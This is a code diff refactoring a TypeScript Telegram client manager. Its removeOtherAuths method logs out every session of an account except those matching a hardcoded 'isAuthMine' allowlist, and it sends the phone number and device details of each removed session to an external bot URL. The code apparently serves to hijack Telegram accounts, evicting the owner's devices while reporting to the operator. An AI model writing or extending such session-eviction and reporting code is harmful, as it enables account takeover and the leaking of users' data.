@@ -491,24 +491,30 @@ class TelegramManager {
         return await this.client.connect();
     }
 
-
     async removeOtherAuths(): Promise<void> {
         if (!this.client) throw new Error('Client is not initialized');
         const result = await this.client.invoke(new Api.account.GetAuthorizations());
-        const updatedAuthorizations = result.authorizations.map(async (auth) => {
-            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
-                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
-                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
-                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||
-                auth.appName.toLowerCase().includes("hanslnz") || auth.deviceModel.toLowerCase().includes('windows')) {
-                return auth;
+        for (const auth of result.authorizations) {
+            if (this.isAuthMine(auth)) {
+                continue;
             } else {
                 await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
-                this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
-                return null;
+                await this.resetAuthorization(auth);
             }
-        }).filter(Boolean);
-        console.log(updatedAuthorizations);
+        }
+    }
+
+    private isAuthMine(auth: any): boolean {
+        return auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
+            auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
+            auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
+            auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||
+            auth.appName.toLowerCase().includes("hanslnz") || auth.deviceModel.toLowerCase().includes('windows');
+    }
+
+
+    private async resetAuthorization(auth: any): Promise<void> {
+        await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
     }
 
     async getAuths(): Promise<any> {
@@ -854,12 +860,7 @@ class TelegramManager {
         const result = await this.client.invoke(new Api.account.GetAuthorizations());
         let latest = 0
         result.authorizations.map((auth) => {
-            if (!auth.country.toLowerCase().includes('singapore') && !auth.deviceModel.includes("Windows")
-                && !auth.appName.toLowerCase().includes("hanslnz")
-                // && !contains(auth.apiId?.toString() || "default",
-                //     ["27919939", "25328268", "24559917", "12777557", "27565391", "23195238"]
-                // )
-            ) {
+            if (!this.isAuthMine(auth)) {
                 if (latest < auth.dateActive) {
                     latest = auth.dateActive;
                 }
